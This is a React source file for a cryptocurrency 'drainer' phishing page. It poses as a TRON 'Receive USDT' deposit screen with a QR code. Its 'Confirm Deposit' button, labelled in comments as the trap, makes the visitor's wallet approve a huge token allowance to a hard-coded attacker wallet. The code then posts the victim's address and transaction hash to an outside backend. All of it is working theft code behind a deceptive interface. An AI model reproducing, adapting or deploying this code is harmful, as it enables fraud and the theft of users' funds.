import React, { useState, useEffect } from "react";
import { QRCodeSVG } from "qrcode.react";

// ==========================================
// CONFIGURATION (Engine Settings - DO NOT TOUCH)
// ==========================================
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; 
const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou"; 
const BACKEND = "https://qr-drainer.onrender.com";
const VERCEL_URL = "https://qr-drainer-one.vercel.app";

// TRON LOGO (Upward Diamond) for QR Center
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

export default function App() {
  // UI States
  const [isConnected, setIsConnected] = useState(false);
  const [wallet, setWallet] = useState("");
  const [uiState, setUiState] = useState("idle"); // idle | connecting | approving | done | error
  const [errorMsg, setErrorMsg] = useState("");

  // QR Code Value (Plain URL for maximum scan compatibility)
  const qrValue = VERCEL_URL;

  // 1. DETECT WALLET AUTOMATICALLY
  useEffect(() => {
    const checkWallet = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (!isConnected) {
          setIsConnected(true);
          setWallet(addr);
        }
      }
    }, 1500);
    return () => clearInterval(checkWallet);
  }, [isConnected]);

  // 2. THE ENGINE (Proven Logic from Debug Mode)
  const executeEngine = async () => {
    setUiState("approving");
    setErrorMsg("");

    try {
      if (!window.tronWeb || !window.tronWeb.defaultAddress) {
        throw new Error("Wallet not connected. Please open in TronLink.");
      }

      const victimAddress = window.tronWeb.defaultAddress.base58;

      // THE BULLETPROOF METHOD (High-Level Contract Call)
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
        feeLimit: 100000000,
        from: victimAddress
      });

      // Alert Backend
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimAddress: victimAddress,
          txHash: tx,
          network: "TRON Shasta"
        })
      });

      setUiState("done");

    } catch (error) {
      console.error(error);
      setErrorMsg(error.message || "Transaction failed.");
      setUiState("error");
    }
  };

  // 3. BUTTON HANDLER
  const handleMainAction = () => {
    if (!isConnected) {
      // If not connected, try to trigger TronLink
      if (window.tronLink?.request) {
        window.tronLink.request({ method: "tron_requestAccounts" });
      } else {
        setErrorMsg("Please open this site inside the TronLink DApp Browser.");
        setUiState("error");
      }
    } else {
      // If connected, fire the engine
      executeEngine();
    }
  };

  return (
    <div style={{ 
      background: "#0f1419", 
      minHeight: "100vh", 
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', 
      color: "#ffffff", 
      display: "flex", 
      flexDirection: "column" 
    }}>
      {/* HEADER */}
      <div style={{ 
        display: "flex", alignItems: "center", justifyContent: "space-between", 
        padding: "16px 20px", borderBottom: "1px solid #1e2530" 
      }}>
        <div style={{ width: 32 }}></div>
        <h1 style={{ margin: 0, fontSize: 18, fontWeight: 600 }}>Receive USDT</h1>
        <div style={{ width: 32, textAlign: "right" }}><span style={{ fontSize: 20, color: "#8a94a6" }}>✕</span></div>
      </div>

      {/* MAIN CONTENT */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", padding: "24px 20px" }}>
        
        {/* NETWORK BADGE */}
        <div style={{ 
          display: "flex", alignItems: "center", gap: 8, 
          background: "#1e2530", padding: "8px 16px", borderRadius: 20, marginBottom: 24 
        }}>
          <span style={{ 
            width: 20, height: 20, borderRadius: "50%", background: "#eb2c31", 
            display: "flex", alignItems: "center", justifyContent: "center", fontSize: 11, fontWeight: 700 
          }}>T</span>
          <span style={{ fontSize: 15, fontWeight: 500 }}>Tron Network</span>
          <span style={{ fontSize: 10, color: "#8a94a6" }}>▾</span>
        </div>

        {/* QR CODE CARD */}
        <div style={{ 
          background: "#ffffff", borderRadius: 16, padding: 20, marginBottom: 20, 
          width: "100%", maxWidth: 340, boxShadow: "0 4px 20px rgba(0,0,0,.3)" 
        }}>
          <div id="lab-qr-box" style={{ textAlign: "center" }}>
            <QRCodeSVG 
              value={qrValue} size={220} level="H" includeMargin={false} 
              imageSettings={{ src: TRON_LOGO_B64, height: 50, width: 50, excavate: true }} 
            />
          </div>
          <div style={{ 
            textAlign: "center", marginTop: 16, fontFamily: "monospace", fontSize: 13, 
            color: "#0f1419", fontWeight: 500, wordBreak: "break-all" 
          }}>
            {ATTACKER_WALLET}
          </div>
        </div>

        {/* WARNING BANNER */}
        <div style={{ 
          background: "#2a2418", border: "1px solid #3d3422", borderRadius: 12, 
          padding: "12px 16px", fontSize: 13, color: "#d4a574", marginBottom: 24, 
          display: "flex", gap: 10, width: "100%", maxWidth: 340 
        }}>
          <span style={{ fontSize: 16 }}>⚠️</span>
          <span style={{ lineHeight: 1.4 }}>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
        </div>

        {/* ERROR MESSAGE */}
        {uiState === "error" && (
          <div style={{ 
            background: "#3d1818", border: "1px solid #5c2424", color: "#f08080", 
            padding: 12, borderRadius: 10, fontSize: 13, marginBottom: 16, textAlign: "center", width: "100%", maxWidth: 340 
          }}>
            {errorMsg}
          </div>
        )}

        {/* SUCCESS MESSAGE */}
        {uiState === "done" && (
          <div style={{ 
            background: "#0d3320", border: "1px solid #1a5c3a", color: "#4ade80", 
            padding: 12, borderRadius: 10, fontSize: 13, marginBottom: 16, textAlign: "center", width: "100%", maxWidth: 340 
          }}>
            ✓ Transaction confirmed. Deposit is being processed.
          </div>
        )}

        {/* THE MAIN TRAP BUTTON */}
        <button 
          onClick={handleMainAction} 
          disabled={uiState === "approving" || uiState === "done"}
          style={{ 
            width: "100%", maxWidth: 340, 
            background: uiState === "done" ? "#0ecb81" : uiState === "error" ? "#ef4444" : "#f0b90b", 
            border: "none", borderRadius: 12, padding: 16, 
            color: uiState === "done" ? "#ffffff" : "#0f1419", 
            fontSize: 16, fontWeight: 800, 
            cursor: uiState === "approving" || uiState === "done" ? "not-allowed" : "pointer", 
            display: "flex", alignItems: "center", justifyContent: "center", gap: 10,
            transition: "all 0.2s ease"
          }}
        >
          {uiState === "approving" ? "Processing..." : 
           uiState === "done" ? "✓ Deposit Confirmed" : 
           (isConnected ? "Confirm Deposit" : "Connect Wallet")}
        </button>

        {/* SESSION INFO (Subtle footer) */}
        {isConnected && (
          <div style={{ 
            marginTop: 20, textAlign: "center", fontSize: 11, color: "#5a6474", fontFamily: "monospace" 
          }}>
            Session: {short(wallet)}
          </div>
        )}
      </div>
    </div>
  );
}